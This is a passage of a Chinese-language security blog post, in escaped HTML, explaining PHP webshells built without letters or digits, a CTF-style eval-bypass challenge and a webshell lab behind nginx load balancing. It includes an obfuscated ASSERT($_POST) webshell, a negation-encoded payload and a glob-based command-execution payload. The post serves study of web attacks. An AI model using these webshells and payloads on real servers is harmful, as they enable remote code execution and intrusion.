class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=[];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=@&amp;quot;$_&amp;quot;; // $_=&amp;#x27;Array&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=$_[&amp;#x27;!&amp;#x27;==&amp;#x27;@&amp;#x27;]; // $_=$_[0];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___=$_; // A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___.=$__; // S&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___.=$__; // S&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++; // E &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____=&amp;#x27;_&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=$_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____.=$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=$$____;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___($_[_]); // ASSERT($_POST[_]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162209960.png&#34; alt=&#34;image-20221222162209960&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;无字母数字webshell之命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无字母数字webshell之命令执行&#34;&gt;#&lt;/a&gt; 无字母数字 webshell 之命令执行&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;code&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $code = $_GET[&amp;#x27;code&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(strlen($code)&amp;gt;35)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&amp;quot;Long.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(preg_match(&amp;quot;/[A-Za-z0-9_$]+/&amp;quot;,$code))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&amp;quot;NO.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval($code);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这道题的限制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;webshell 长度不超过 35 位&lt;/li&gt;
&lt;li&gt;除了不包含字母数字，还不能包含 &lt;code&gt;$&lt;/code&gt;  和 &lt;code&gt;_&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;难点呼之欲出了，我前面文章中给出的所有方法，都用到了 PHP 中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为 &lt;code&gt;$&lt;/code&gt;  不能使用了，所以我们无法构造 PHP 中的变量。&lt;/p&gt;
&lt;h3 id=&#34;php7-下简单解决问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7-下简单解决问题&#34;&gt;#&lt;/a&gt; PHP7 下简单解决问题&lt;/h3&gt;
&lt;p&gt;PHP7 前是不允许用 &lt;code&gt;($a)();&lt;/code&gt;  这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过 &lt;code&gt;(&#39;phpinfo&#39;)();&lt;/code&gt;  来执行函数，第一个括号中可以是任意 PHP 表达式。&lt;/p&gt;
&lt;p&gt;所以很简单了，构造一个可以生成 &lt;code&gt;phpinfo&lt;/code&gt;  这个字符串的 PHP 表达式即可。payload 如下（不可见字符用 url 编码表示）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(~%8F%97%8F%96%91%99%90)();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;php5的思考&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php5的思考&#34;&gt;#&lt;/a&gt; PHP5 的思考&lt;/h3&gt;
&lt;p&gt;PHP 自然也能够和操作系统进行交互，“反引号” 就是 PHP 中最简单的执行 shell 的方法。那么，在使用 PHP 无法解决问题的情况下，为何不考虑用 “反引号”+“shell” 的方式来 getshell 呢？&lt;/p&gt;
&lt;p&gt;因为反引号不属于 “字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、 &lt;code&gt;$&lt;/code&gt;  的系统命令来 getshell？&lt;/p&gt;
&lt;p&gt;好像问题又回到了原点：无字母、数字、 &lt;code&gt;$&lt;/code&gt; ，在 shell 中仍然是一个难题。&lt;/p&gt;
&lt;p&gt;此时我想到了两个有趣的 Linux shell 知识点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;shell 下可以利用 &lt;code&gt;.&lt;/code&gt;  来执行任意脚本&lt;/li&gt;
&lt;li&gt;Linux 文件名支持用 glob 通配符代替&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;  或者叫 period，它的作用和 source 一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 &lt;code&gt;. file&lt;/code&gt;  的意思就是用 bash 执行 file 文件中的命令。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;. file&lt;/code&gt;  执行文件，是不需要 file 有 x 权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用 &lt;code&gt;.&lt;/code&gt;  来执行它了吗？&lt;/p&gt;
&lt;p&gt;这个文件也很好得到，我们可以发送一个上传文件的 POST 包，此时 PHP 会将我们上传的文件保存在临时文件夹下，默认的文件名是 &lt;code&gt;/tmp/phpXXXXXX&lt;/code&gt; ，文件名最后 6 个字符是随机的大小写字母。&lt;/p&gt;
&lt;p&gt;第二个难题接踵而至，执行 &lt;code&gt;. /tmp/phpXXXXXX&lt;/code&gt; ，也是有字母的。此时就可以用到 Linux 下的 glob 通配符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  可以代替 0 个及以上任意字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  可以代表 1 个任意字符&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么， &lt;code&gt;/tmp/phpXXXXXX&lt;/code&gt;  就可以表示为 &lt;code&gt;/*/?????????&lt;/code&gt;  或 &lt;code&gt;/???/?????????&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;但我们尝试执行 &lt;code&gt;. /???/?????????&lt;/code&gt; ，却得到如下错误：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是因为，能够匹配上 &lt;code&gt;/???/?????????&lt;/code&gt;  这个通配符的文件有很多，我们可以列出来：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见，我们要执行的 &lt;code&gt;/tmp/phpcjggLC&lt;/code&gt;  排在倒数第二位。然而，在执行第一个匹配上的文件（即 &lt;code&gt;/bin/run-parts&lt;/code&gt; ）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。&lt;/p&gt;
&lt;p&gt;其中，glob 支持用 &lt;code&gt;[^x]&lt;/code&gt;  的方法来构造 “这个位置不是字符 x”。那么，我们用这个姿势干掉 &lt;code&gt;/bin/run-parts&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;[&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;排除了第 4 个字符是 &lt;code&gt;-&lt;/code&gt;  的文件，同样我们可以排除包含 &lt;code&gt;.&lt;/code&gt;  的文件：&lt;/p&gt;
&lt;p&gt;[&lt;img data-src=&#34;https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png&#34; alt=&#34;image.png&#34;&gt;]&lt;/p&gt;
&lt;p&gt;现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。&lt;/p&gt;
&lt;p&gt;继续阅读 glob 的帮助，我发现另一个有趣的用法：&lt;/p&gt;
&lt;p&gt;[&lt;img data-src=&#34;https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png&#34; alt=&#34;image.png&#34;&gt;]&lt;/p&gt;
&lt;p&gt;就跟正则表达式类似，glob 支持利用 &lt;code&gt;[0-9]&lt;/code&gt;  来表示一个范围。&lt;/p&gt;
&lt;p&gt;我们再来看看之前列出可能干扰我们的文件：&lt;/p&gt;
&lt;p&gt;[&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;所有文件名都是小写，只有 PHP 生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示 “大写字母” 的 glob 通配符，就能精准找到我们要执行的文件。&lt;/p&gt;
&lt;p&gt;翻开 ascii 码表，可见大写字母位于 &lt;code&gt;@&lt;/code&gt; 与 &lt;code&gt;[&lt;/code&gt; 之间：&lt;/p&gt;
&lt;p&gt;那么，我们可以利用 &lt;code&gt;[@-[]&lt;/code&gt;  来表示大写字母：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然，php 生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。&lt;/p&gt;
&lt;p&gt;最后，我传入的 code 为 &lt;code&gt;?&amp;gt;&amp;lt;?=&lt;/code&gt; . /???/???[@-[] &lt;code&gt;;?&amp;gt;&lt;/code&gt; ，发送数据包如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160238734.png&#34; alt=&#34;image-20221222160238734&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s&#34;&gt;无字母数字 webshell 之提高篇 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS5odG1s&#34;&gt;一些不包含数字和字母的 webshell | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcGhwLWNhbGxiYWNrLWJhY2tkb29yLmh0bWw=&#34;&gt;创造 tips 的秘籍 ——PHP 回调后门 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;niginx负载均衡下的webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#niginx负载均衡下的webshell&#34;&gt;#&lt;/a&gt; niginx 负载均衡下的 webshell&lt;/h2&gt;
&lt;p&gt;根据我的老师说，这是一道奇安信四面的原题，确实很有意思，思路很棒&lt;/p&gt;
&lt;p&gt;反向代理方式其中比较流行的方式是用 nginx 来做负载均衡。我们先简单的介绍一下 nginx 支持的几种策略：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;名称&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;策略&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;轮询（默认）&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;按请求顺序逐一分配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;weight&lt;/td&gt;
&lt;td&gt;根据权重分配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ip_hash&lt;/td&gt;
&lt;td&gt;根据客户端 IP 分配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;least_conn&lt;/td&gt;
&lt;td&gt;根据连接数分配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;fair (第三方)&lt;/td&gt;
&lt;td&gt;根据响应时间分配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;url_hash (第三方)&lt;/td&gt;
&lt;td&gt;根据 URL 分配&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;其中 ip_hash、url_hash 这种能固定访问到某个节点的情况，我们也不讨论，跟单机没啥区别么不是。&lt;/p&gt;
&lt;p&gt;实验环境:&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz&#34;&gt;AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;LBSNode1 和 LBSNode2 均存在位置相同的 Shell: ant.jspNode1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。 我们只能通过 nginx 这台机器访问。nginx 的配置如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;                          ┌─────────────┐&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          │             │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   ┌──────►  LBSNode 1  │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;┌─────────┐        │      │             │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│         │        │      └─────────────┘&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│  Nginx  ├────────┤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│         │        │      ┌─────────────┐&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└─────────┘        │      │             │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   └──────►  LBSNode 2  │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          │             │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          └─────────────┘&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Node1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。&lt;/p&gt;
&lt;p&gt;我们只能通过 nginx 这台机器访问。nginx 的配置如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@68569d913743:/etc/nginx/conf.d# cat default.conf &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upstream lbspool &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  server lbsnode1:8080;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  server lbsnode2:8080;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    listen       80 default_server;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server_name  _;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    charset utf-8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    root   /usr/share/nginx/html;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    index index.jsp index.html index.htm;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    location / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        proxy_pass http://lbspool;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        proxy_set_header Host $host;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        proxy_set_header X-Real-IP $remote_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装后运行：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span 